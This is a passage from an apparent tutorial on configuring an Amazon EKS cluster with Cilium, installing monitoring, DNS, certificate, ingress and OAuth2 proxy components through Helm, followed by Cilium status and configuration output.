ingress-nginx, cert-manager, oauth2-proxy, and others. mailhog MailHog will be used to receive email alerts from Prometheus. Install the mailhog Helm chart and modify its default values: # renovate: datasource=helm depName=mailhog registryUrl=https://codecentric.github.io/helm-charts MAILHOG_HELM_CHART_VERSION=\"5.2.3\" helm repo add --force-update codecentric https://codecentric.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailhog.yml\" &lt;&lt; EOF image: repository: docker.io/cd2team/mailhog tag: \"1663459324\" ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/sj26/mailcatcher/main/assets/images/logo_large.png forecastle.stakater.com/appName: Mailhog nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: nginx hosts: - host: mailhog.${CLUSTER_FQDN} paths: - path: / pathType: ImplementationSpecific tls: - hosts: - mailhog.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILHOG_HELM_CHART_VERSION}\" --namespace mailhog --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailhog.yml\" mailhog codecentric/mailhog kube-prometheus-stack The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It’s combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Endpoint ports: 10260 (kube-prometheus-stack-operator/https) 8080 (kube-prometheus-stack-prometheus/reloader-web) 9090 (kube-prometheus-stack-prometheus/http-web) 8080 (kube-prometheus-stack-kube-state-metrics/http) 9100 (kube-prometheus-stack-prometheus-node-exporter/http-metrics) 10250 (kube-prometheus-stack-kubelet/https-metrics) -&gt; 10253 (conflicts with kubelet, cert-manager, …) 10255 (kube-prometheus-stack-kubelet/http-metrics) 4194 (kube-prometheus-stack-kubelet/cadvisor) 8081 (kube-prometheus-stack-kube-state-metrics/telemetry-port) -&gt; 8082 (conflicts with karpenter) Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false alertmanager: config: global: smtp_smarthost: \"mailhog.mailhog.svc.cluster.local:1025\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email-notifications routes: - receiver: email-notifications matchers: [ '{severity=~\"warning|critical\"}' ] receivers: - name: email-notifications email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/alert-manager.png forecastle.stakater.com/appName: Alert Manager nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false serviceMonitor: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/grafana.png forecastle.stakater.com/appName: Grafana nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} datasources: datasource.yaml: apiVersion: 1 datasources: - name: Prometheus type: prometheus url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090/ access: proxy isDefault: true dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 33 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9852-stians-disk-graphs: # renovate: depName=\"node-exporter disk graphs\" gnetId: 9852 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 11875-kubernetes-ingress-nginx-eks: # renovate: depName=\"Kubernetes Ingress Nginx - EKS\" gnetId: 11875 revision: 1 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus 13473-portefaix-kubernetes-cluster-overview: # renovate: depName=\"Portefaix / Kubernetes cluster Overview\" gnetId: 13473 revision: 2 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 26 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 37 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 34 datasource: Prometheus 15759-kubernetes-views-nodes: # renovate: depName=\"Kubernetes / Views / Nodes\" gnetId: 15759 revision: 29 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 16 datasource: Prometheus 15762-kubernetes-system-coredns: # renovate: depName=\"Kubernetes / System / CoreDNS\" gnetId: 15762 revision: 17 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 3 datasource: Prometheus 16237-cluster-capacity: # renovate: depName=\"Cluster Capacity (Karpenter)\" gnetId: 16237 revision: 1 datasource: Prometheus 16236-pod-statistic: # renovate: depName=\"Pod Statistic (Karpenter)\" gnetId: 16236 revision: 1 datasource: Prometheus 16611-cilium-metrics: # renovate: depName=\"Cilium v1.12 Agent Metrics\" gnetId: 16611 revision: 1 datasource: Prometheus 16612-cilium-operator: # renovate: depName=\"Cilium v1.12 Operator Metrics\" gnetId: 16612 revision: 1 datasource: Prometheus 16613-hubble: # renovate: depName=\"Cilium v1.12 Hubble Metrics\" gnetId: 16613 revision: 1 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus 18855-fluent-bit: # renovate: depName=\"Fluent Bit\" gnetId: 18855 revision: 1 datasource: Prometheus grafana.ini: analytics: check_for_updates: false server: root_url: https://grafana.${CLUSTER_FQDN} # Use oauth2-proxy instead of default Grafana Oauth auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: \"mailhog.mailhog.svc.cluster.local:1025\" from_address: grafana@${CLUSTER_FQDN} networkPolicy: enabled: true kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false kubeProxy: enabled: false kube-state-metrics: hostNetwork: true networkPolicy: enabled: true selfMonitor: enabled: true telemetryPort: 8082 prometheus-node-exporter: networkPolicy: enabled: true hostNetwork: true prometheusOperator: tls: # https://github.com/prometheus-community/helm-charts/issues/2248 internalPort: 10253 networkPolicy: enabled: true hostNetwork: true prometheus: networkPolicy: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cncf/artwork/master/projects/prometheus/icon/color/prometheus-icon-color.svg forecastle.stakater.com/appName: Prometheus nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false retentionSize: 1GB walCompression: true storageSpec: volumeClaimTemplate: spec: storageClassName: gp3 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi hostNetwork: true EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack karpenter Endpoint ports: 8000 (http-metrics) 8081 8443 (https-webhook) -&gt; 8444 (conflicts with ingress-nginx) Customize the Karpenter default installation by upgrading its Helm chart and modifying the default values: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ KARPENTER_HELM_CHART_VERSION=\"v0.31.4\" tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" &lt;&lt; EOF replicas: 1 serviceMonitor: enabled: true hostNetwork: true webhook: port: 8444 settings: aws: enablePodENI: true reservedENIs: \"1\" EOF helm upgrade --install --version \"${KARPENTER_HELM_CHART_VERSION}\" --namespace karpenter --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" karpenter oci://public.ecr.aws/karpenter/karpenter Cilium - monitoring Add Hubble to Cilium, enabling Prometheus metrics and other observability features: helm repo add --force-update cilium https://helm.cilium.io/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cilium.yml\" &lt;&lt; EOF hubble: metrics: serviceMonitor: enabled: true enabled: - dns - drop - tcp - flow - icmp - http prometheus: enabled: true serviceMonitor: enabled: true relay: enabled: true prometheus: enabled: true serviceMonitor: enabled: true ui: enabled: true ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cilium/hubble/83a6345a7100531d4e8c54ba0a92352051b8c861/Documentation/images/hubble_logo.png forecastle.stakater.com/appName: Hubble UI nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri className: nginx hosts: - hubble.${CLUSTER_FQDN} tls: - hosts: - hubble.${CLUSTER_FQDN} prometheus: enabled: true serviceMonitor: enabled: true envoy: prometheus: enabled: true serviceMonitor: enabled: true operator: prometheus: enabled: true serviceMonitor: enabled: true EOF helm upgrade --install --version \"${CILIUM_HELM_CHART_VERSION}\" --namespace cilium --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cilium.yml\" cilium cilium/cilium aws-for-fluent-bit Fluent Bit is an open-source log processor and forwarder that allows you to collect data like metrics and logs from different sources, enrich it with filters, and send it to multiple destinations. Endpoint ports: 2020 (monitor-agent) Install the aws-for-fluent-bit Helm chart and modify its default values: # renovate: datasource=helm depName=aws-for-fluent-bit registryUrl=https://aws.github.io/eks-charts AWS_FOR_FLUENT_BIT_HELM_CHART_VERSION=\"0.1.32\" helm repo add --force-update eks https://aws.github.io/eks-charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-for-fluent-bit.yml\" &lt;&lt; EOF cloudWatchLogs: region: ${AWS_DEFAULT_REGION} logGroupTemplate: \"/aws/eks/${CLUSTER_NAME}/cluster\" logStreamTemplate: \"\\$kubernetes['namespace_name'].\\$kubernetes['pod_name']\" serviceAccount: create: false name: aws-for-fluent-bit hostNetwork: true dnsPolicy: ClusterFirstWithHostNet serviceMonitor: enabled: true extraEndpoints: - port: metrics path: /metrics interval: 30s scrapeTimeout: 10s scheme: http EOF helm upgrade --install --version \"${AWS_FOR_FLUENT_BIT_HELM_CHART_VERSION}\" --namespace aws-for-fluent-bit --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-for-fluent-bit.yml\" aws-for-fluent-bit eks/aws-for-fluent-bit cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters and simplifies the process of obtaining, renewing, and using those certificates. Endpoint ports: 10250 (cert-manager-webhook/https) -&gt; 10251 (conflicts with kube-prometheus-stack-kubelet/https-metrics) The cert-manager ServiceAccount was created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF installCRDs: true serviceAccount: create: false name: cert-manager extraArgs: - --cluster-resource-namespace=cert-manager - --enable-certificate-owner-ref=true securityContext: fsGroup: 1001 prometheus: servicemonitor: enabled: true webhook: securePort: 10251 hostNetwork: true networkPolicy: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager Add ClusterIssuers for the Let’s Encrypt staging environment: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_DEFAULT_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF external-dns ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns ServiceAccount was created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF domainFilters: - ${CLUSTER_FQDN} interval: 20s policy: sync serviceAccount: create: false name: external-dns serviceMonitor: enabled: true EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns ingress-nginx ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Endpoint ports: 80 (http) 443 (https) 8443 (https-webhook) 10254 (metrics) Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.9.1\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: hostNetwork: true allowSnippetAnnotations: true ingressClassResource: default: true admissionWebhooks: networkPolicyEnabled: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: service.beta.kubernetes.io/aws-load-balancer-type: nlb service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx forecastle Forecastle is a control panel that dynamically discovers and provides a launchpad for accessing applications deployed on Kubernetes. Install the forecastle Helm chart and modify its default values: # renovate: datasource=helm depName=forecastle registryUrl=https://stakater.github.io/stakater-charts FORECASTLE_HELM_CHART_VERSION=\"1.0.136\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" &lt;&lt; EOF forecastle: config: namespaceSelector: any: true title: Launch Pad networkPolicy: enabled: true ingress: enabled: true annotations: nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth className: nginx hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${FORECASTLE_HELM_CHART_VERSION}\" --namespace forecastle --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" forecastle stakater/forecastle oauth2-proxy Use OAuth2 Proxy to protect application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"6.24.1\" set +x COOKIE_SECRET=\"$(openssl rand -base64 32 | head -c 32 | base64)\" echo \"::add-mask::${COOKIE_SECRET}\" set -x helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: ${COOKIE_SECRET} configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true className: nginx hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy Cilium details Let’s check the Cilium status using the Cilium CLI: cilium status -n cilium /¯¯\\ /¯¯\\__/¯¯\\ Cilium: OK \\__/¯¯\\__/ Operator: OK /¯¯\\__/¯¯\\ Envoy DaemonSet: disabled (using embedded mode) \\__/¯¯\\__/ Hubble Relay: OK \\__/ ClusterMesh: disabled Deployment hubble-ui Desired: 1, Ready: 1/1, Available: 1/1 Deployment hubble-relay Desired: 1, Ready: 1/1, Available: 1/1 Deployment cilium-operator Desired: 1, Ready: 1/1, Available: 1/1 DaemonSet cilium Desired: 2, Ready: 2/2, Available: 2/2 Containers: hubble-relay Running: 1 cilium-operator Running: 1 cilium Running: 2 hubble-ui Running: 1 Cluster Pods: 18/18 managed by Cilium Helm chart version: 1.14.0 Image versions hubble-relay quay.io/cilium/hubble-relay:v1.14.0@sha256:bfe6ef86a1c0f1c3e8b105735aa31db64bcea97dd4732db6d0448c55a3c8e70c: 1 cilium-operator quay.io/cilium/operator-aws:v1.14.0@sha256:396953225ca4b356a22e526a9e1e04e65d33f84a0447bc6374c14da12f5756cd: 1 cilium quay.io/cilium/cilium:v1.14.0@sha256:5a94b561f4651fcfd85970a50bc78b201cfbd6e2ab1a03848eab25a82832653a: 2 hubble-ui quay.io/cilium/hubble-ui:v0.12.0@sha256:1c876cfa1d5e35bc91e1025c9314f922041592a88b03313c22c1f97a5d2ba88f: 1 hubble-ui quay.io/cilium/hubble-ui-backend:v0.12.0@sha256:8a79a1aad4fc9c2aa2b3e4379af0af872a89fcec9d99e117188190671c66fc2e: 1 The Cilium configuration can be found in the cilium-config ConfigMap: kubectl -n cilium get configmap cilium-config -o yaml apiVersion: v1 data: agent-not-ready-taint-key: node.cilium.io/agent-not-ready arping-refresh-period: 30s auto-create-cilium-node-resource: \"true\" auto-direct-node-routes: \"false\" aws-enable-prefix-delegation: \"true\" aws-release-excess-ips: \"true\" bpf-lb-external-clusterip: \"false\" bpf-lb-map-max: \"65536\" bpf-lb-sock: \"false\" bpf-map-dynamic-size-ratio: \"0.0025\" bpf-policy-map-max: \"16384\" bpf-root: /sys/fs/bpf cgroup-root: /run/cilium/cgroupv2 cilium-endpoint-gc-interval: 5m0s cluster-id: \"0\" cluster-name: k01 cni-exclusive: \"true\" cni-log-file: /var/run/cilium/cilium-cni.log cnp-node-status-gc-interval: 0s custom-cni-conf: \"false\" debug: \"false\" debug-verbose: \"\" disable-cnp-status-updates: \"true\" ec2-api-endpoint: \"\" egress-gateway-reconciliation-trigger-interval: 1s egress-masquerade-interfaces: eth0 enable-auto-protect-node-port-range: \"true\" enable-bandwidth-manager: \"true\" enable-bbr: \"false\" enable-bgp-control-plane: \"false\" enable-bpf-clock-probe: \"false\" enable-endpoint-health-checking: \"true\" enable-endpoint-routes: \"true\" enable-health-check-nodeport: \"true\" enable-health-checking: \"true\" enable-hubble: \"true\" enable-hubble-open-metrics: \"false\" enable-ipv4: \"true\" enable-ipv4-big-tcp: \"false\" enable-ipv4-masquerade: \"true\" enable-ipv6: \"false\" enable-ipv6-big-tcp: \"false\" enable-ipv6-masquerade: \"true\" enable-k8s-networkpolicy: \"true\" enable-k8s-terminating-endpoint: \"true\" enable-l2-neigh-discovery: \"true\" enable-l7-proxy: \"true\" enable-local-redirect-policy: \"false\" enable-metrics: \"true\" enable-policy: default enable-remote-node-identity: \"true\" enable-sctp: \"false\" enable-svc-source-range-check: \"true\" enable-vtep: \"false\" enable-well-known-identities: \"false\" enable-wireguard: \"true\" enable-xt-socket-fallback: \"true\" eni-tags: '{\"cluster\":\"k01.k8s.mylabs.dev\",\"owner\":\"petr.ruzicka@gmail.com\",\"product_id\":\"12345\",\"used_for\":\"dev\"}' external-envoy-proxy: \"false\" hubble-disable-tls: \"false\" hubble-listen-address: :4244 hubble-metrics: dns drop tcp flow icmp http hubble-metrics-server: :9965 hubble-socket-path: /var/run/cilium/hubble.sock hubble-tls-cert-file: /var/lib/cilium/tls/hubble/server.crt hubble-tls-client-ca-files: /var/lib/cilium/tls/hubble/client-ca.crt hubble-tls-key-file: /var/lib/cilium/tls/hubble/server.key identity-allocation-mode: crd identity-gc-interval: 15m0s identity-heartbeat-timeout: 30m0s install-no-conntrack-iptables-rules: \"false\" ipam: eni ipam-cilium-node-update-rate: 15s k8s-client-burst: \"10\" k8s-client-qps: \"5\" kube-proxy-replacement: disabled mesh-auth-enabled: \"true\" mesh-auth-gc-interval: 5m0s mesh-auth-queue-size: \"1024\" mesh-auth-rotated-identities-queue-size: \"1024\" monitor-aggregation: medium monitor-aggregation-flags: all monitor-aggregation-interval: 5s node-port-bind-protection: \"true\" nodes-gc-interval: 5m0s operator-api-serve-addr: 127.0.0.1:9234 operator-prometheus-serve-addr: :9963 preallocate-bpf-maps: \"false\" procfs: /host/proc prometheus-serve-addr: :9962 proxy-connect-timeout: \"2\" proxy-max-connection-duration-seconds: \"0\" proxy-max-requests-per-connection: \"0\" proxy-prometheus-port: \"9964\" remove-cilium-node-taints: \"true\" routing-mode: native set-cilium-is-up-condition: \"true\" set-cilium-node-taints: \"true\" sidecar-istio-proxy-image: cilium/istio_proxy skip-cnp-status-startup-clean: \"false\" synchronize-k8s-nodes: \"true\" tofqdns-dns-reject-response-code: refused tofqdns-enable-dns-compression: \"true\" tofqdns-endpoint-max-ip-per-hostname: \"50\" tofqdns-idle-connection-grace-period: 0s tofqdns-max-deferred-connection-deletes: \"10000\" tofqdns-proxy-response-max-delay: 100ms unmanaged-pod-watcher-interval: \"15\" update-ec2-adapter-limit-via-api: \"true\" vtep-cidr: \"\" vtep-endpoint: \"\" vtep-mac: \"\" vtep-mask: \"\" write-cni-conf-when-ready: /host/etc/cni/net.d/05-cilium.conflist kind: ConfigMap metadata: annotations: meta.helm.sh/release-name: cilium meta.helm.sh/release-namespace: cilium creationTimestamp: \"2023-08-18T17:02:55Z\" labels: app.kubernetes.io/managed-by: Helm name: cilium-config namespace: cilium resourceVersion: \"5229\" uid: 9d1392b8-6a3b-403c-81ce-500393eeb3e3 Here’s a different way to run cilium status on a Kubernetes worker node: kubectl exec -n cilium ds/cilium -- cilium status Defaulted container \"cilium-agent\" out of: cilium-agent, config (init), mount-cgroup (init), apply-sysctl-overwrites (init), mount-bpf-fs (init), clean-cilium-state (init), install-cni-binaries (init) KVStore: Ok Disabled Kubernetes: Ok 1.25+ (v1.25.12-eks-2d98532) [linux/amd64] Kubernetes APIs: [\"EndpointSliceOrEndpoint\", \"cilium/v2::CiliumClusterwideNetworkPolicy\", \"cilium/v2::CiliumEndpoint\", \"cilium/v2::CiliumNetworkPolicy\", \"cilium/v2::CiliumNode\", \"cilium/v2alpha1::CiliumCIDRGroup\", \"core/v1::Namespace\", \"core/v1::Pods\", \"core/v1::Service\", \"networking.k8s.io/v1::NetworkPolicy\"] KubeProxyReplacement: Disabled Host firewall: Disabled CNI Chaining: none Cilium: Ok 1.14.0 (v1.14.0-b5013e15) NodeMonitor: Listening for events on 2 CPUs with 64x4096 of shared memory Cilium health daemon: Ok IPAM: IPv4: 9/32 allocated, IPv4 BIG TCP: Disabled IPv6 BIG TCP: Disabled BandwidthManager: EDT with BPF [CUBIC] [eth0] Host Routing: Legacy Masquerading: IPTables [IPv4: Enabled, IPv6: Disabled] Controller Status: 55/55 healthy Proxy Status: OK, ip 192.168.8.67, 0 redirects active on ports 10000-20000, Envoy: embedded Global Identity Range: min 256, max 65535 Hubble: Ok Current/Max Flows: 4095/4095 (100.00%), Flows/s: 8.21 Metrics: Ok Encryption: Wireguard [NodeEncryption: Disabled, cilium_wg0 (Pubkey: AxE7xXNN/Izr5ajkE48eSWtOH2WeQBTwhjS3Rma1tDo=, Port: 51871, Peers: 1)] Cluster health: 2/2 reachable (2023-08-18T17:53:44Z) Useful details about Cilium networking can be found by listing the ciliumnodes CRD: kubectl describe ciliumnodes.cilium.io Name: ip-192-168-19-152.ec2.internal Namespace: Labels: alpha.eksctl.io/cluster-name=k01 alpha.eksctl.io/nodegroup-name=mng01-ng beta.kubernetes.io/arch=arm64 beta.kubernetes.io/instance-type=t4g.medium beta.kubernetes.io/os=linux eks.amazonaws.com/capacityType=ON_DEMAND eks.amazonaws.com/nodegroup=mng01-ng eks.amazonaws.com/nodegroup-image=ami-05d67a5609bec1651 